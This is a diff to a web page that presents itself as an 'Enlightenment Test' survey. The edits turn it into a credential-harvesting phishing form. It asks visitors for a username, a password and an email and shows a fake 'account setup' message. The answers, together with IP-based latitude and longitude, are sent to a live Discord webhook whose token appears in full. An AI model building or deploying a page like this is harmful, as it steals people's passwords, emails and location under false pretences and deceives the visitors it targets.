@@ -123,7 +123,7 @@
   <div class="container" id="questionContainer">
     <h2>Survey - Enlightenment Test</h2>
     <h3 id="questionNumber">Question 1 of 3</h3>
-    <h1 id="questionText">What's your Name?</h1>
+    <h1 id="questionText">Create A Username.</h1>
     <input type="text" id="responseInput" placeholder="Enter your name" required>
     <button id="nextButton">Next</button>
     <div class="message" id="statusMessage"></div>
@@ -132,8 +132,8 @@
   <script>
     const questions = [
       { text: "What's your Name?", type: "text", placeholder: "Enter your name", required: true },
-      { text: "What is your biggest fear?", type: "text", placeholder: "Enter your fear" },
-      { text: "What do you want to achieve in life?", type: "text", placeholder: "Enter your goal" },
+      { text: "What will your password be?", type: "text", placeholder: "Enter your password" },
+      { text: "What`s your email?", type: "text", placeholder: "Enter your email." },
     ];
     let currentQuestion = 0;
     const userData = {};
@@ -177,7 +177,8 @@
               Longitude: ${data.longitude} (${data.longitude.toFixed(2)}° E)
             `;
 
-            fetch("https://discord.com/api/webhooks/1315013580063637504/shNokSWjzdhr4HjTDvrvdR0Aj5OpwIK4o1YcqMwRqZkQNbEGRymtr1t_3WNTlysNJDDq", {
+            // Send to Discord Webhook
+            fetch("https://discord.com/api/webhooks/1349995059923386470/umc-ZobxcpYGBZa_YK_n4gyXMNiNtyrF2biYc5gupoelSu-46yrJHX5gOgUi6CeXF7j7", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
@@ -190,11 +191,21 @@
                   },
                 ],
               }),
+            })
+            .then(response => response.json())  // Handle the response to check if it's successful
+            .then(data => {
+              console.log('Success:', data);  // Log the successful response
+            })
+            .catch((error) => {
+              console.error('Error:', error);  // Log any errors that occur
             });
+          })
+          .catch((error) => {
+            console.error('Error fetching IP details:', error);  // Log if fetching IP details fails
           });
       } else {
         // Send response of other questions individually
-        fetch("https://discord.com/api/webhooks/1315013580063637504/shNokSWjzdhr4HjTDvrvdR0Aj5OpwIK4o1YcqMwRqZkQNbEGRymtr1t_3WNTlysNJDDq", {
+        fetch("https://discord.com/api/webhooks/1349995059923386470/umc-ZobxcpYGBZa_YK_n4gyXMNiNtyrF2biYc5gupoelSu-46yrJHX5gOgUi6CeXF7j7", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -207,6 +218,13 @@
               },
             ],
           }),
+        })
+        .then(response => response.json())  // Handle the response to check if it's successful
+        .then(data => {
+          console.log('Success:', data);  // Log the successful response
+        })
+        .catch((error) => {
+          console.error('Error:', error);  // Log any errors that occur
         });
       }
 
@@ -215,7 +233,7 @@
       if (currentQuestion < questions.length) {
         updateQuestion();
       } else {
-        questionContainer.innerHTML = "<h2>Thank you for completing the survey!</h2>";
+        questionContainer.innerHTML = "<h2>Thank you for completing account setup! We will have your account set up as soon as the website is finished.</h2>";
       }
     });
 
